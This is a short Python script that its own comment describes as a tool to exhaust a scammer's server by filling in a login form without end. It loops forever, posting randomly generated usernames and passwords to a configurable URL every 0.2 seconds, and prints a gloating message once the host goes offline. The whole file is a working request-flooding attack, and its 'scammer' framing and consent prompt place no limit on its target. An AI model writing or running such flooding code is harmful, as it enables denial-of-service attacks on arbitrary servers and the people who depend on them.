#!/usr/bin/python3

# Tool to exhaust the resources of a server of a scammer (!) by infinitely filling in a login form

import requests, random, string, time, sys

input("By clicking any button you accept that all consequences are on you")

def gen():
    randomstring = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(10)])
    return "%s@%s.com" % (randomstring, randomstring)

def post(url,email,passwd):
    data = {
        'username' : email,     # Change 'username' to a parameter that's applicable
        'password' : passwd     # Change 'password' to a parameter that's applicable
    }
    try:
        req = requests.post(url,data=data,timeout=10)
    except:
        print("Host is offline :)") 
        sys.exit()

while True:
    url = "http://localhost"    # Change this to the correct url
    email = gen()
    password = gen()[:-16]
    post(url,email,password)
    time.sleep(0.2)
    
    